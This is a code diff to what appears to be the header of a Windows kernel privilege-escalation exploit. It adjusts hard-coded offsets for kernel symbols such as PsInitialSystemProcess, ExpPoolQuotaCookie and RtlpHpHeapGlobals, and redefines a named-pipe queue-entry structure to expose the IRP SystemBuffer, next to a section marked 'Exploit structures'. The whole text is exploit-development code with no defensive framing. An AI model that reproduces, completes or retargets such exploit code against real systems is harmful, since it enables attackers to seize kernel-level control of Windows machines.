@@ -17,9 +17,9 @@
 
 // Kernel function and variable offsets
 #define nt_PsInitialSystemProcess_OFFSET 0xCFC420
-#define nt_ExAllocatePoolWithTag_OFFSET 0x9B7010
+#define nt_ExAllocatePoolWithTag_OFFSET 0x9B8010
 #define nt_ExpPoolQuotaCookie_OFFSET 0xCFC9E8
-#define nt_RtlpHpHeapGlobals_OFFSET 0xC1DD00
+#define nt_RtlpHpHeapGlobals_OFFSET 0xC1DD40
 #define Npfs_imp_ExAllocatePoolWithTag_OFFSET 0x7050
 
 // Pipe structure offsets
@@ -78,13 +78,11 @@ typedef struct pipe_queue_entry
 } pipe_queue_entry_t;
 static_assert(sizeof(pipe_queue_entry_t) == 0x30, "pipe_queue_entry_t must be 0x30 bytes");
 
-typedef struct pipe_queue_entry_sub
+typedef struct pipe_queue_entry_irp
 {
-    uint64_t unk;
-    uint64_t unk1;
-    uint64_t unk2;
-    uint64_t data_ptr;
-} pipe_queue_entry_sub_t;
+    uint64_t unknown[3];
+    uint64_t SystemBuffer;
+} pipe_queue_entry_irp_t;
 
 // Exploit structures
 typedef struct vs_chunk
